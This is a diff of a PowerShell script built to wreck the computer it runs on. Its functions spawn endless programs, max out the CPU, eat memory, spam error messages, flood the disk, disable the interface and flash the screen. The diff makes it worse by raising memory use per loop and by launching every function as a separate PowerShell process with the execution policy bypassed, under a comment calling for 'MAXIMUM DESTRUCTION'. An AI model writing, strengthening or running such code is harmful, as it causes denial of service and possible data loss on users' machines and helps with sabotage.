@@ -14,14 +14,14 @@ function Open-EndlessPrograms {
 
 function Overload-CPU {
     while ($true) {
-        1..1000000 | % { Start-Job { 1..100000 | % { $_ * $_ } } }
+        1..1000000 | ForEach-Object { [math]::Pow($_, 2) }  # Heavy CPU Calculation
     }
 }
 
 function Overload-RAM {
     $array = @()
     while ($true) {
-        $array += , (New-Object byte[] (1MB * 10)) # Consumes 10MB RAM per loop
+        $array += , (New-Object byte[] (1MB * 50))  # Consumes 50MB RAM per loop
     }
 }
 
@@ -54,18 +54,18 @@ function Glitch-Screen {
         $form.TopMost = $true
         $form.FormBorderStyle = "None"
         $form.Show()
-        Start-Sleep -Milliseconds 100
+        Start-Sleep -Milliseconds 50
         $form.Close()
     }
 }
 
-# Run everything in parallel for MAXIMUM DESTRUCTION
-Start-Job -ScriptBlock { Open-EndlessPrograms }
-Start-Job -ScriptBlock { Overload-CPU }
-Start-Job -ScriptBlock { Overload-RAM }
-Start-Job -ScriptBlock { Spam-ErrorMessages }
-Start-Job -ScriptBlock { Flood-Disk }
-Start-Job -ScriptBlock { Disable-UI }
-Start-Job -ScriptBlock { Glitch-Screen }
+# RUN ALL CHAOTIC FUNCTIONS **WITHOUT JOBS**
+Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command { Open-EndlessPrograms }"
+Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command { Overload-CPU }"
+Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command { Overload-RAM }"
+Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command { Spam-ErrorMessages }"
+Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command { Flood-Disk }"
+Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command { Disable-UI }"
+Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command { Glitch-Screen }"
 
 while ($true) { Start-Sleep 1 }
